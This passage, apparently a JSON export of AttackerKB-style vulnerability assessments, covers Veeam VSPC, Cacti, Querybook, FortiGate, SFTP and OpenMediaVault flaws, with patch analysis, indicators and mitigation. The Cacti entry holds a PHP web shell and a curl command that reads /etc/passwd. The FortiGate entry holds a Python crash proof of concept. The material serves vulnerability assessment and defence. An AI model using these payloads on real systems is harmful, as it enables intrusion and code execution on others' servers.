\"DelegateSerializationHolder\", \"DataSet\", \"PSObject\", \"ResourceSet\", \"RolePrincipal\", \"SessionSecurityToken\", \"SessionViewStateHistoryItem\", TextFormattingRunProperties\", \"WindowsClaimsIdentity\", \"WindowsIdentity\", \"ClaimsIdentity\", \"DataTable\", \"ObjRef\", \"ToolboxItemContainer\"`.\r\n\r\nThe first of the two patches improved `BindToType` to remove the \"Veeam\" string allowlisting. This, and the lack of new forbidden entries, seems to indicate that the string \"Veeam\" is leveraged by the exploit's serialized payload to take advantage of the string exclusion. There's also a call to `Type.GetType`, though it's unclear what purpose it serves in the initial patch. \r\n```C#\r\n\tpublic override Type BindToType(string assemblyName, string typeName)\r\n\t{\r\n\t\tint num = typeName.IndexOf(\",\", StringComparison.Ordinal);\r\n\t\tif (num > 0)\r\n\t\t{\r\n\t\t\ttypeName = typeName.Substring(0, num);\r\n\t\t}\r\n\t\tif (Array.Exists(_forbiddenTypes, (string t) => typeName.EndsWith(t, StringComparison.OrdinalIgnoreCase)))\r\n\t\t{\r\n\t\t\tthrow new ArgumentException(\"Deserialization of type \" + typeName + \" is prohibited.\");\r\n\t\t}\r\n\t\tType.GetType(typeName + \", \" + assemblyName);\r\n\t\treturn _wrappedBinder?.BindToType(assemblyName, typeName);\r\n\t}\r\n```\r\nNext, we'll take a look at the content of the \"patch reissue\". In this example, `Type.GetType` is now used by the `fullName` variable, which is then used to check more comprehensively for forbidden types. This improved function also verifies that `fullName` is not `null`. Notably, the exception being thrown also now includes a debugging message that prints how `typeName` was parsed. This seems to indicate that the first patch may have been bypassed by confusing the parser. \r\n```C#\r\n\tpublic override Type BindToType(string assemblyName, string typeName)\r\n\t{\r\n\t\tstring fullName = Type.GetType(typeName + \", \" + assemblyName)?.FullName;\r\n\t\tif (fullName == null || Array.Exists(_forbiddenTypes, (string t) => fullName.EndsWith(t, StringComparison.OrdinalIgnoreCase)))\r\n\t\t{\r\n\t\t\tthrow new ArgumentException(\"Deserialization of type '\" + typeName + \"' (parsed as '\" + fullName + \"') is prohibited.\");\r\n\t\t}\r\n\t\treturn _wrappedBinder?.BindToType(assemblyName, typeName);\r\n\t}\r\n```\r\nBased on the content of the secondary patch, it seems likely it was implemented in response to a patch bypass, not just to use `Type.GetType` and harden the application. The excellent CODE WHITE research linked above outlines some [.NET type parsing quirks](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html#Advantages/Disadvantages%20of%20Validation%20Before/After%20Type%20Binding) when using serialization binders, which is probably the kind of thing this patch is trying to harden against.\r\n\r\nThe filter outlined above is referenced only by `Veeam.MBP.AgentManager\\Veeam.AC.AgentManagement\\ReceiverWrapper.cs`, where it's used within `SetupSerializationBinder` and scoped for `ChannelHostReceiver` and `MultiplexedStreamReceiver` receiver types. \r\n```C#\r\nprivate void SetupSerializationBinder(ChannelHostReceiver receiver)\r\n{\r\n\tif (receiver.MessageSerializer is NetBinarySerializer netBinarySerializer)\r\n\t{\r\n\t\tnetBinarySerializer.CustomSerializationBinder = BinarySerializerVulnerabilityFilter.Wrap(netBinarySerializer.CustomSerializationBinder);\r\n\t}\r\n}\r\n\r\nprivate void SetupSerializationBinder(MultiplexedStreamReceiver receiver)\r\n{\r\n\tif (receiver.MessageSerializer is NetBinarySerializer netBinarySerializer)\r\n\t{\r\n\t\tnetBinarySerializer.CustomSerializationBinder = BinarySerializerVulnerabilityFilter.Wrap(netBinarySerializer.CustomSerializationBinder);\r\n\t}\r\n}\r\n```\r\nThe first patch also included a handful of changes in various areas of the code base that return early if entity nodes of the type `BackupObject` are encountered. For example, within `Veeam.MBP.EntityImpl\\Veeam.MBP.EntityImpl.EntityExtension\\DataModelEntityExtension.cs`, the application now checks if entities are of the type `BackupObject` before updating and adding child nodes.\r\n\r\n```C#\r\n\tpublic static void UpdateTraverse<T>(this T entity, T newEntity) where T : EntityDataModelDbNode\r\n\t{\r\n+\t\tif (entity is BackupObject)\r\n+\t\t{\r\n+\t\t\treturn;\r\n+\t\t}\r\n\t\tif (entity == null)\r\n\t\t{\r\n\t\t\tthrow new ArgumentNullException(\"entity\");\r\n\t\t}\r\n\t\ttry\r\n\t\t{\r\n\t\t\tUpdateCurrentNode(entity, newEntity);\r\n\t\t\tAddOrUpdateChildNodes(entity, newEntity);\r\n\t\t}\r\n\t\tcatch (Exception e)\r\n\t\t{\r\n\t\t\tLog.Error(e);\r\n\t\t\tthrow;\r\n\t\t}\r\n\t}\r\n\r\n[..]\r\n\r\n\tprivate static void AddOrUpdateChildNodes<T>(T oldEntity, T newEntity) where T : EntityDataModelDbNode\r\n\t{\r\n\t\tList<BaseEntity> childEntitiesClone = newEntity.ChildEntitiesClone;\r\n\t\tIDictionary<string, EntityDataModelDbNode> dictionary = childEntitiesClone.OfType<EntityDataModelDbNode>().DistinctBySystemNameToDictionary();\r\n\t\tforeach (EntityDataModelDbNode oldChild in oldEntity.ChildEntitiesClone.OfType<EntityDataModelDbNode>())\r\n\t\t{\r\n+\t\t\tif (oldChild is BackupObject)\r\n+\t\t\t{\r\n+\t\t\t\tcontinue;\r\n+\t\t\t}\r\n\t\t\tif (dictionary.TryGetValue(oldChild.SystemName, out var value))\r\n\t\t\t{\r\n\t\t\t\tdictionary.Remove(oldChild.SystemName);\r\n\t\t\t\toldChild.UpdateTraverse(value);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tbool alwaysAlive = oldChild.GetTypeSystemName().AlwaysAlive;\r\n\t\t\tbool flag = childEntitiesClone.Any((BaseEntity a) => a.GetType() == oldChild.GetType());\r\n\t\t\tif (!alwaysAlive || flag)\r\n\t\t\t{\r\n\t\t\t\toldChild.Delete();\r\n\t\t\t}\r\n\t\t}\r\n\t\tforeach (KeyValuePair<string, EntityDataModelDbNode> item in dictionary)\r\n\t\t{\r\n\t\t\tEntityDataModelDbNode value2 = item.Value;\r\n\t\t\tLog.Verbose(\"{0} was added\", value2.SystemName);\r\n\t\t\tvalue2.CloneNode(oldEntity);\r\n\t\t}\r\n\t}\r\n```\r\n### Summarizing Exploitation\r\nBased on what we've seen in static analysis, the exploitation flow probably looks something like this:\r\n- Authenticate to the server as a client or hijack an existing authenticated agent connection. \r\n- Target the backup server (managed by the provider) with a serialized payload, scoped to be handled by the receiver's custom `BinarySerializerVulnerabilityFilter`. VSPC Server deserializes client-provided data in a number of different places and relies on the filtering to catch unsafe types, so there are likely multiple possible deserialization sinks.\r\n- Before the first patch, the serialized payload's type will likely contain the string \"Veeam\" and be related to the `BackupObject` type. \r\n- After the second patch, if exploitation is still viable, exploit attempts will likely attempt to confuse .NET type name parsing to get a malicious object deserialized.\r\n\r\n### Interacting with VSPC Server\r\nAs an addendum, though most of this analysis is based on static code review, I also want to summarize some information I've learned about the VSPC communication protocol for TCP ports 1989 and 9999. When VSPC Server receives a new connection from the client, it expects two bytes, a Veeam \"type\" byte and a \"version\" byte, followed by some XML data with the XML string length prepended as a 7-bit integer. The XML object, which should be a `Connector` for the first interaction, can specify a `connectTo` receiver, as well as a `gate` to interact with. For example, opening a new channel can be performed by decoding and sending the following data to port 1989.\r\n```\r\nAgXTAQo8Q29ubmVjdG9yPgo8Y29ubmVjdFRvIHJlY2VpdmVyPSJSZWNlaXZlclY0Ij4KPGdhdGUgbmFtZT\r\n0iQXV0aGVudGljYXRlZCIgdGltZW91dD0iMTIwMDAwIi8+CjwvY29ubmVjdFRvPgo8ZW5kcG9pbnQ+Cjx2\r\nZXJzaW9uPjU8L3ZlcnNpb24+CjwvZW5kcG9pbnQ+Cjxjb25uZWN0aW9uVHlwZT5Ob3JtYWw8L2Nvbm5lY3\r\nRpb25UeXBlPgo8ZGF0YS8+CjwvQ29ubmVjdG9yPgo\r\n```\r\nDecoded, the XML string included above defines an XML `Connector` object, which specifies a `ReceiverV4` receiver for post-authenticated interactions. This type seems to be affiliated with `ReceiverWrapper`, which is the class that sets up the custom serialization filter that was patched. \r\n```xml\r\n<Connector>\r\n<connectTo receiver=\"ReceiverV4\">\r\n<gate name=\"Authenticated\" timeout=\"120000\"/>\r\n</connectTo>\r\n<endpoint>\r\n<version>5</version>\r\n</endpoint>\r\n<connectionType>Normal</connectionType>\r\n<data/>\r\n</Connector>\r\n```\r\nWith a new connection open, the server should return a response containing a GUID for a new channel. \r\n```xml\r\n<Response status=\"Ok\"><attributes><attr name=\"channelId\" value=\"f9f1ab9c-b78f-46ed-b28b-be6b012e0afd\" /><attr name=\"protocolVersion\" value=\"5\" /></attributes></Response>\r\n```\r\nThe server will then upgrade the unencrypted connection to an encrypted connection and perform a handshake and authentication flow. ",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "07c9b36e-09e6-4af9-bcee-447510ffbcdb",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "baa8a491-16b0-4505-b173-a75cba087d6d",
      "created": "2024-06-25T08:01:54.744576Z",
      "revisionDate": "2024-07-01T08:08:32.635146Z",
      "document": "Cacti versions prior to 1.2.27 are [vulnerable](https://karmainsecurity.com/KIS-2024-04) to arbitrary file write that could lead to RCE. This requires authentication and the account needs the `Template Editor` permission to exploit this vulnerability.\r\n\r\n### Exploit\r\nOnce authenticated, the attacker just needs to import the following XML package, with the desired payload previously base64 encoded.\r\n\r\n```xml\r\n<xml>\r\n   <files>\r\n      <file>\r\n         <name>resource/payload.php</name>\r\n         <data>...base64 encoded payload\u2026</data>\r\n         <filesignature>...base64 encoded signature of the payload file</filesignature>\r\n      </file>\r\n   </files>\r\n   <publickey>...base64 encoded public key...</publickey>\r\n   <signature>...base64 encoded signature of this package XML file\u2026</signature>\r\n</xml>\r\n```\r\n\r\nNote that the signatures of the payload and the XML file are RSA-based signatures with SHA-256.\r\n\r\nThe entire XML has to be Gzipped before being sent through the `Import/Export` > `Import Packages` page. This results in having our PHP payload file being extracted to the `resource/` directory, which is accessible externally at `http://<catci host>/<cacti root path>/resource/payload.php`.\r\n\r\nOne typical payload to achieve code execution would be:\r\n```php\r\n<?php system($_GET['cmd']); ?>\r\n```\r\n\r\nwhich can be triggered by sending the following request:\r\n```\r\n\u276f curl \"http://127.0.0.1:8080/cacti/resource/payload.php?cmd=cat+/etc/passwd\"\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\r\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\r\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\r\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\r\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\r\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\r\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\r\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\r\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\r\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\r\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\r\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\r\n```\r\n\r\n### Analysis\r\n\r\nThe following code snippet from the `import_package()` function in `lib/import.php` is responsible for handling the import of the XML package:\r\n```php\r\n 517         foreach ($data['files']['file'] as $f) {\r\n 518                 $fdata = base64_decode($f['data']);\r\n 519                 $name = $f['name'];\r\n 520\r\n 521                 if (strpos($name, 'scripts/') !== false || strpos($name, 'resource/') !== false) {\r\n 522                         $filename = $config['base_path'] . \"/$name\";\r\n 523\r\n 524                         if (!$preview) {\r\n 525                                 if (!cacti_sizeof($import_files) || in_array($name, $import_files)) {\r\n 526                                         cacti_log('Writing file: ' . $filename, false, 'IMPORT', POLLER_VERBOSITY_MEDIUM);\r\n 527\r\n 528                                         if ((is_writeable(dirname($filename)) && !file_exists($filename)) || is_writable($filename)) {\r\n 529                                                 $file = fopen($filename, 'wb');\r\n 530\r\n 531                                                 if (is_resource($file)) {\r\n 532                                                         fwrite($file , $fdata, strlen($fdata));\r\n 533                                                         fclose($file);\r\n 534                                                         clearstatcache();\r\n 535                                                         $filestatus[$filename] = __('written');\r\n 536                                                 } else {\r\n```\r\n\r\nThe `data` is decoded line 518 and written to file on line 532. The filename is retrieved from the `name` field line 519 and must include `'scripts/` or `resource/` (line 521). The final destination path is constructed line 522. Since the `scripts/` directory is not accessible externally, having our payload in the `resource/` directory is the preferred option.\r\n\r\nNote that there is no protection against path traversal and it should be possible to set the file `name` to something like `resource/../../../../../../../<path from the root>/payload` and write the payload anywhere on the filesystem, as long as the user running Cacti has the right permissions.\r\n\r\n### IoC\r\nThe original [PoC](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) and the Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/19196) sends a minimum XML package and many optional fields are missing. This generates a series of entries in the main Cacti log (`<cacti installation path>/log/cacti.log`). These can be a good indicator the exploit has been executed.\r\n\r\n```\r\n\u2026\r\n2024-06-25 07:47:00 - CMDPHP PHP ERROR NOTICE Backtrace:  (/package_import.php[41]:form_save(), /package_import.php[195]:import_package(), /lib/import.php[607]:CactiErrorHandler())\r\n2024-06-25 07:47:00 - ERROR PHP NOTICE: Undefined index: info in file: /var/www/html/cacti/lib/import.php  on line: 341\r\n2024-06-25 07:47:00 - CMDPHP PHP ERROR NOTICE Backtrace:  (/package_import.php[41]:form_save(), /package_import.php[200]:import_display_package_data(), /package_import.php[451]:import_package_get_details(), /lib/import.php[341]:CactiErrorHandler())\r\n2024-06-25 07:47:00 - ERROR PHP NOTICE: Undefined index: author in file: /var/www/html/cacti/package_import.php  on line: 481\r\n2024-06-25 07:47:00 - CMDPHP PHP ERROR NOTICE Backtrace:  (/package_import.php[41]:form_save(), /package_import.php[200]:import_display_package_data(), /package_import.php[481]:CactiErrorHandler())\r\n2024-06-25 07:47:00 - ERROR PHP NOTICE: Undefined index: homepage in file: /var/www/html/cacti/package_import.php  on line: 482\r\n2024-06-25 07:47:00 - CMDPHP PHP ERROR NOTICE Backtrace:  (/package_import.php[41]:form_save(), /package_import.php[200]:import_display_package_data(), /package_import.php[482]:CactiErrorHandler())\r\n2024-06-25 07:47:00 - ERROR PHP NOTICE: Undefined index: email in file: /var/www/html/cacti/package_import.php  on line: 483\r\n2024-06-25 07:47:00 - CMDPHP PHP ERROR NOTICE Backtrace:  (/package_import.php[41]:form_save(), /package_import.php[200]:import_display_package_data(), /package_import.php[483]:CactiErrorHandler())\r\n2024-06-25 07:47:00 - ERROR PHP NOTICE: Undefined index: copyright in file: /var/www/html/cacti/package_import.php  on line: 490\r\n\u2026\r\n```\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "4e765b62-7e23-42f7-a194-a9166d3ed70d",
      "editorId": "514a77d0-dfa6-4205-95f9-1d458464a59d",
      "topicId": "d0f6a783-7f63-4ba2-96ac-637e1de8ed8d",
      "created": "2024-06-26T22:29:07.308062Z",
      "revisionDate": "2024-07-01T08:08:33.933072Z",
      "document": "Entered URL through Draft.js entity data (props.contentState.getEntity(props.entityKey).getData()) in querybook/webapp/lib/richtext/ index.tsx (line 13) misses validation of URL schema using Safelist ('http:', 'https:'), resulting in client-side XSS at <Link to={url} newTab> (line 15), enabling ACE when exploited.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "90bfe080-9e30-4248-8bfc-882ba39cef39",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "109fea80-cabe-46a8-a2af-61fdbaedbff7",
      "created": "2024-06-28T03:42:39.941381Z",
      "revisionDate": "2024-07-02T00:33:25.677979Z",
      "document": "## Attacker Value & Exploitability \r\nCVE-2024-21762 is a memory corruption vulnerability that affects a very wide range of FortiNet Firewalls. However it is difficult to exploit and is likely that every affected version will require its own unique offsets, ROP chain etc. in order to be exploited successfully. Patching should be prioritized as these devices sit on the edge of the network however widespread exploitation across all versions is quite unlikely. Due to these factors I\u2019d say the attacker value is a 3/5 as financially motivated sophisticated threat actors could still benefit from this exploit although the exploitability I would say is quite low, 1/5, given the complexities that come along with a memory corruption vulnerability such as this one. \r\n\r\n## Technical Analysis\r\nFortiOS and FortiProxy with the SSL VPN feature enabled (which is not enabled by default) are vulnerable to an out-of-bound write vulnerability which can allow an unauthenticated attacker to execute arbitrary code by sending specially crafted HTTP requests. The affected versions are:\r\n\r\n| Version        | Affected             | Solution                   |\r\n| -------------- | -------------------- | -------------------------- |\r\n| FortiOS 7.4    | 7.4.0 through 7.4.2  | Upgrade to 7.4.3 or above  |\r\n| FortiOS 7.2    | 7.2.0 through 7.2.6  | Upgrade to 7.2.7 or above  |\r\n| FortiOS 7.0    | 7.0.0 through 7.0.13 | Upgrade to 7.0.14 or above |\r\n| FortiOS 6.4    | 6.4.0 through 6.4.14 | Upgrade to 6.4.15 or above |\r\n| FortiOS 6.2    | 6.2.0 through 6.2.15 | Upgrade to 6.2.16 or above |\r\n| FortiOS 6.0    | 6.0.0 through 6.0.17 | Upgrade to 6.0.18 or above |\r\n| FortiProxy 7.4 | 7.4.0 through 7.4.2  | Upgrade to 7.4.3 or above  |\r\n| FortiProxy 7.2 | 7.2.0 through 7.2.8  | Upgrade to 7.2.9 or above  |\r\n| FortiProxy 7.0 | 7.0.0 through 7.0.14 | Upgrade to 7.0.15 or above |\r\n| FortiProxy 2.0 | 2.0.0 through 2.0.13 | Upgrade to 2.0.14 or above |\r\n| FortiProxy 1.2 | 1.2 all versions     | Migrate to a fixed release |\r\n| FortiProxy 1.1 | 1.1 all versions     | Migrate to a fixed release |\r\n| FortiProxy 1.0 | 1.0 all versions     | Migrate to a fixed release |\r\n\r\nThe vulnerability stems from how the request body is parsed when the header `Transfer-Encoding: Chunked` is set. The vulnerability in itself is quite limited - all it allows for is the ability to write two bytes (\\\\r\\\\n) out of bounds onto the stack. Since all you have to work with is two bytes which have to be `0a0d` achieving RCE by directly hijacking rip is not an option and so one must focus on the memory pointers saved on the stack. \r\n\r\nBelow is a simple PoC which can be used to trigger the vulnerability and cause a segmentation fault:\r\n```python\r\nimport socket\r\nimport ssl\r\n\r\ndef create_ssock(hostname, port):\r\n    try:\r\n        context = ssl.create_default_context()\r\n        context.check_hostname = False\r\n        context.verify_mode = ssl.CERT_NONE\r\n        ssock = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)\r\n        ssock.connect((hostname, port))\r\n        return ssock\r\n    except Exception as e:\r\n        print(f\"Error creating secure socket: {e}\")\r\n        return None\r\n\r\nhostname = '192.168.1.50'  # Replace with your target hostname\r\nport = 443  # Replace with your target port if different\r\n\r\npkt = b\"\"\"\\\r\nGET / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n%s\\r\\n%s\\r\\n\\r\\n\"\"\" % (hostname.encode(), b\"0\"*((0x202e//2)-2), b\"a\")\r\n\r\nssock = create_ssock(hostname, port)\r\nif ssock:\r\n    ssock.send(pkt)\r\n    response = ssock.recv(4096)\r\n    print(response)\r\nelse:\r\n    print(\"Failed to create a secure socket.\")\r\n\r\n```\r\n\r\nThe above crash PoC will result in the following segmentation fault:\r\n\r\n![Screenshot 2024-06-19 at 1 44 55\u202fPM](https://github.com/rapid7/metasploit-framework/assets/23320005/b6b25135-ed59-4877-8c61-d231c7984ac2)\r\n\r\nWe can see that the stack pointer has been overwritten by our two bytes `0x0a0d`. Turning this seemingly harmless out of bounds write into RCE is no easy process. \r\n\r\nBy decompiling the binaries of the SSL VPN you can see that a certain function of interest saves the values of `r13` and a few other registers on the stack and restores them when the function returns. `r13` is of particular interest because it holds a structure pointer to a structure called `a1` which happens to hold an address on the heap. \r\n\r\nThe goal here is to spray the heap with our desired payload. Then trigger the out of bounds write vulnerability when the heap address is stored in `r13` such that the low byte of the `a1` pointer is overwritten and if all goes to plan, will point to the pre-arranged memory as the shown below:\r\n\r\n![Screenshot 2024-06-19 at 1 44 55\u202fPM](https://github.com/rapid7/metasploit-framework/assets/23320005/0167003b-82c0-44f8-b70c-4108e7b87d96)\r\n\r\nWith this we could reliably redirect the `r13` pointer to a buffer we control. Now we just have to fill the buffer with our payload and we should have remote code execution.\r\n\r\nOnce the above is successfully set up and the memory pointed to is controllable the hard part is done. Normally at this point you would use the system function to execute commands. However in FortiGate this is not an option - the system function cannot be used as the system function  runs `/bin/sh` and the `/bin/sh` binary on the FortiGate device is a custom application which only runs a few commands. \r\n\r\nSo if we look back to a previous FortiGate vulnerability from last year CVE-2023-27997 (a similar memory corruption vulnerability in the SSL VPN component) and a number of others FortiGate exploits, they often overwrite a function pointer in an SSL struct which can be triggered by a call to `SSL_do_handshake`.\r\n\r\nSince `SSL_do_handshake` is dynamically linked we can call it ourselves. We control the first argument and just have to create an SSL struct with the function pointer where we need it.  \r\n\r\nOnce the struct is set up we can load an address from our buffer and now we have direct execution to an arbitrary address. Now all that's left to do is to construct a ROP chain that will set up and call `execl` with the same Node.js reverse shell as the last FortiGate exploit. Lucky for exploit devs the FortiGate main program is an all in one binary with a size of over 70MB which provides a plethora of gadgets which can be used. \r\n\r\nThere is a lot more that goes into ensuring that this process is successful and if you're interested in exactly how it works I would suggest reading the following wonderfully written [blog post](https://www.assetnote.io/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762). \r\n\r\n\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "b4dd0bda-ae2f-4ec2-992e-bea386861f29",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "f83ee394-ee97-468b-bfa6-48e80210983d",
      "created": "2024-07-01T08:23:17.314938Z",
      "revisionDate": "2024-07-02T00:34:58.469276Z",
      "document": "Based on our AttackerKB [Rapid7 Analysis](https://attackerkb.com/topics/44EZLG2xgL/cve-2024-5806#rapid7-analysis), I have rated the exploitability as high, as an exploit can easily be implemented by modifying an existing SFTP library to trigger the auth bypass. However, when running the exploit, the attacker must first know the username of a valid user account on the target server. I have rated the attacker value as very high, as this is an auth bypass in an SFTP service of an enterprise file transfer solution.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4449caee-544e-4984-ace6-4f5b53c0d2f2",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "032ff8d2-8bf6-4519-98c9-f568e9d99c40",
      "created": "2024-07-01T23:08:00.398087Z",
      "revisionDate": "2024-07-02T14:33:29.544283Z",
      "document": "**TL;DR:** Neat! Doesn't sound like something that's going to be easily exploited or automated in pretty much any scenario, so I have little initial concern about widespread exploitation, or even exploitation at all. I'd expect a long tail of follow-on patches as various distros/products patch it out. Patch, sure, but no need for panic as far as we can tell. \r\n\r\nAs usual, happy to be proven wrong, but from the (very good!) [Qualys technical write-up](https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt), this is a memory corruption bug where an adversary would have to win a race condition to exploit it successfully. The Qualys write-up even explicitly notes that \"In our experiments, it takes ~10,000 tries on average to win this race condition; i.e., with 10 connections (MaxStartups) accepted per 120 seconds (LoginGraceTime), it takes ~1-2 days on average to obtain a remote root shell.\"",
      "score": 4,
      "metadata": {
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "9e0899a6-dbbb-4874-9f0e-bff88432ea37",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "66f82f50-dcf3-4c3b-9e7b-53ce2e3f0734",
      "created": "2024-07-02T09:14:47.759601Z",
      "revisionDate": "2024-07-22T19:42:23.140751Z",
      "document": "This is a golden oldie, that never has been fixed. The existing module in Metasploit , `exploit/multi/http/openmediavault_cmd_exec` works only on versions in the range `0.4.x`\r\nUnfortunately the vulnerability still exists within all OpenMediaVault versions starting from from `0.5` until the recent release `7.4.2-2` and it allows an authenticated user to create and run cron jobs as root on the system.\r\nI have created a new [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/19298) that can handle all targets from versions `0.1` and above. Shodan shows more then 10000 vulnerable instances and hundreds of them still have the default `admin:openmediavault` credentials configured which allows an attacker to leverage this exploit.\r\n\r\nThis module has been  successfully tested on:\r\n\r\n**OpenMediaVault x64 appliances:**\r\n* openmediavault_0.2_amd64.iso\r\n* openmediavault_0.2.5_amd64.iso\r\n* openmediavault_0.3_amd64.iso\r\n* openmediavault_0.4_amd64.iso\r\n* openmediavault_0.4.32_amd64.iso\r\n* openmediavault_0.5.0.24_amd64.iso\r\n* openmediavault_0.5.48_amd64.iso\r\n* openmediavault_1.9_amd64.iso\r\n* openmediavault_2.0.13_amd64.iso\r\n* openmediavault_2.1_amd64.iso\r\n* openmediavault_3.0.2-amd64.iso\r\n* openmediavault_3.0.26-amd64.iso\r\n* openmediavault_3.0.74-amd64.iso\r\n* openmediavault_4.0.9-amd64.iso\r\n* openmediavault_4.1.3-amd64.iso\r\n* openmediavault_5.0.5-amd64.iso\r\n* openmediavault_5.5.11-amd64.iso\r\n* openmediavault_5.6.13-amd64.iso\r\n* openmediavault_6.0-16-amd64.iso\r\n* openmediavault_6.0-34-amd64.iso\r\n* openmediavault_6.0-amd64.iso\r\n* openmediavault_6.0.24-amd64.iso\r\n* openmediavault_6.5.0-amd64.iso\r\n* openmediavault_7.0-20-amd64.iso\r\n* openmediavault_7.0-32-amd64.iso\r\n\r\n**ARM64 on Raspberry PI running Kali Linux 2024-3:**\r\n* openmediavault 7.3.0-5\r\n* openmediavault 7.4.2-2\r\n\r\n**VirtualBox Images (x64):**\r\n* openmediavault 0.4.24\r\n* openmediavault 0.5.30\r\n* openmediavault 1.0.21\r\n\r\nYou can download the iso images from [here](https://sourceforge.net/projects/openmediavault/files/iso/).\r\n\r\n### Mitigation\r\nThere is no fix available to address this vulnerability. This weakness has been there since 2013 and never fixed. Future releases will probably not fix it. Contacted the lead developer, but did not get any response. The only precaution that you can take is to ensure that you change the default admin credentials. It is not forced, so you need to take the action yourself.\r\n\r\n### 